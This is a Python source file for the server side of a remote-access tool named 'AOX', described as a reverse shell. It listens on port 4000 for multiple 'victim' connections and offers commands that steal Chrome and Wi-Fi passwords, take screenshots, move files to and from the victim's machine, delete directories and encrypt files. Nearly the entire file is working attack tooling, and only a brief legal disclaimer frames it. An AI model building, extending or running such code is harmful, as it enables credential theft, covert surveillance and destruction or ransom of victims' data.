#Created by Xand

#Disclaimer: This reverse shell should only be used in the lawful, remote administration of authorized systems. Accessing a computer network without authorization or permission is illegal.

import socket
import os
from time import gmtime, strftime
import time
import threading



art = """
               AAA                 OOOOOOOOO     XXXXXXX       XXXXXXX
              A:::A              OO:::::::::OO   X:::::X       X:::::X
             A:::::A           OO:::::::::::::OO X:::::X       X:::::X
            A:::::::A         O:::::::OOO:::::::OX::::::X     X::::::X
           A:::::::::A        O::::::O   O::::::OXXX:::::X   X:::::XXX
          A:::::A:::::A       O:::::O     O:::::O   X:::::X X:::::X
         A:::::A A:::::A      O:::::O     O:::::O    X:::::X:::::X
        A:::::A   A:::::A     O:::::O     O:::::O     X:::::::::X
       A:::::A     A:::::A    O:::::O     O:::::O     X:::::::::X
      A:::::AAAAAAAAA:::::A   O:::::O     O:::::O    X:::::X:::::X
     A:::::::::::::::::::::A  O:::::O     O:::::O   X:::::X X:::::X
    A:::::AAAAAAAAAAAAA:::::A O::::::O   O::::::OXXX:::::X   X:::::XXX
   A:::::A             A:::::AO:::::::OOO:::::::OX::::::X     X::::::X
  A:::::A               A:::::AOO:::::::::::::OO X:::::X       X:::::X
 A:::::A                 A:::::A OO:::::::::OO   X:::::X       X:::::X
AAAAAAA                   AAAAAAA  OOOOOOOOO     XXXXXXX       XXXXXXX
"""

print(art)


conn_info = []
client_info = []


command = """
COMMANDS = {
    AOX Shell Commands
             'list':['lists all active connections']
             'select (target number)':['selects a target and allows command to be sent ove to the victim's machine ']
    Client Commands
            'quit':['takes you back to the AOX shell']
            'specs':['Lists information about the victims machine'],
            'chrome_passwords ':['Selects a client by its index. Takes index as a parameter'],
            'wifi_passwords':['gets all the wifi password that the victim's machine has ever connected to'],
            'screenshot':['takes a screen shot of the victims machine'],
            'delete (directory):['deletes all files in the directory specified'],
            'encrypt (password) (directory)':[encrypts all files in the directory specified'],
            'decrypt (password) (directory)':['decrypts all files in the directory specified'],
            'get (filename)':['gets file from the victim;s machine and sends it over to the server'],
            'send (filename)':['send file from server and stores it on the victim's machine'],
           }
"""

print(command)

#sends file from server to victim's machine
def send_file(conn, usrFile):
    if not os.path.exists(usrFile):
        print("[-]File does not exist!!!")
        conn.send(str(" ").encode())
    else:
        fileSize = os.path.getsize(usrFile)
        conn.send(str(fileSize).encode())
        time.sleep(1)
        if fileSize == 0:
            print("[-]File is empty!!!")
            conn.send(str(" ").encode())
        else:
            with open(usrFile, 'rb') as file:
                data = file.read(1024)
                if fileSize < 1024:
                    conn.send(data)
                    file.close()
                else:
                    while data:
                        conn.send(data)
                        data = file.read(1024)
                    file.close()
                print("[+]Data sent!!!")

#recieves file from victim's machine
def receive_file(conn, usrFile):
    fileSize = int(conn.recv(1024).decode())
    if fileSize == 0:
        print("File is empty!!!")
    else:
        with open(usrFile, 'wb') as file:
            if fileSize < 1024:
                data = conn.recv(1024)
                file.write(data)
                file.close()
                print("[+]Data received!!!")
            else:
                data = conn.recv(1024)
                totalFileRecv = len(data)
                while totalFileRecv < fileSize:
                    totalFileRecv += len(data)
                    file.write(data)
                    data = conn.recv(1024)
                file.write(data)
                file.close()
                print("[+]Data received!!!")

#recieves screenshot image
global imgNum
imgNum = 0
def receive_img(conn):
    global imgNum
    imgNum += 1
    with open("img" + str(imgNum) + ".jpg", 'wb') as file:
        fileSize = int(conn.recv(1024).decode())
        data = conn.recv(1024)
        totalFileRecv = len(data)
        while totalFileRecv < fileSize:
            totalFileRecv += len(data)
            file.write(data)
            data = conn.recv(1024)
        file.close()
    print("[+]Image received!!!")

#sends commands to the client
def main(conn):
    try:
        conn.send(str(" ").encode())
        data = conn.recv(1024).decode()
        print(str(data), end="")
    except:
        print("[-]Connection terminated!!!")
    while True:
        cmd = input()
        if cmd == 'quit':
            break
        elif cmd == "":
            try:
                conn.send(str(" ").encode())
                data = conn.recv(1024).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif cmd == "wifi_passwords":
            try:
                conn.send(str(cmd).encode())
                data = conn.recv(65536).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif "get" in cmd:
            try:
                conn.send(str(cmd).encode())
                usrFile = conn.recv(1024).decode()
                data = conn.recv(1024).decode()
                if "File does not exist!!!" not in data:
                    receive_file(conn, usrFile)
                    print(str(data), end="")
                else:
                    print(data)
            except:
                print("[-]Connection terminated!!!")
                break
        elif "send" in cmd:
            try:
                conn.send(str(cmd).encode())
                send_file(conn, cmd[5:])
                data = conn.recv(1024).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif "chrome_passwords" in cmd:
            try:
                conn.send(str(cmd).encode())
                data = conn.recv(65536).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        elif "screenshot" in cmd:
            try:
                conn.send(str(cmd).encode())
                data = conn.recv(1024).decode()
                receive_img(conn)
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break
        else:
            try:
                conn.send(str(cmd).encode())
                data = conn.recv(65536).decode()
                print(str(data), end="")
            except:
                print("[-]Connection terminated!!!")
                break

#connects to the client
def connect():
    global s
    try:
        port = 4000
        host = socket.gethostbyname(socket.gethostname())
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.bind((host, port))
        print("[+] Binding socket to port {}".format(port))
        print("[+]Listening...")
    except socket.error as err:
        print("[+] Error!!! {}".format(err))
    s.listen(100)

#accepts connections from clients b
def accept_connections():
    while True:
        try:
            conn, addr = s.accept()
            conn.setblocking(1)
            print("\n[+]Got connection from {} ".format(addr) + strftime("%a, %d %b %Y %H:%M:%S", gmtime()))
            client_info.append(addr)
            conn_info.append(conn)
        except:
            print("[-]Unable to accept connection!!!")

#displays all active connections
def list_clients():
    for i, conn in enumerate(conn_info):
        try:
            conn.send(str.encode(" "))
            conn.recv(1024)
        except:
            del client_info[i]
            del conn_info[i]
            continue

    client_num = 0
    print('-----Clients-----' + "\n")

    for i in client_info:
        print(str(client_num) + " Client Info: " + str(i).strip("()"))
        client_num += 1

#select a target from conn_info list
def get_target(cmd):
    try:
        target = cmd.replace('select', '')
        target = int(target)
        conn = conn_info[target]
        print("[+]You are now connected to " + str(client_info[target][0]))
        return conn
    except:
        print("[-]Client does not exist!!!")
        return None

#custom shell
def AOX():
    while True:
        print("AOX> ", end="")
        cmd = input()
        if cmd == 'list':
            list_clients()
        elif 'select' in cmd:
           conn =  get_target(cmd)
           if conn is not None:
               main(conn)
        else:
            print("[-]Command not recognized!!!")

connect()
t2 = threading.Thread(target=accept_connections).start()
time.sleep(2)
t3 = threading.Thread(target=AOX).start()
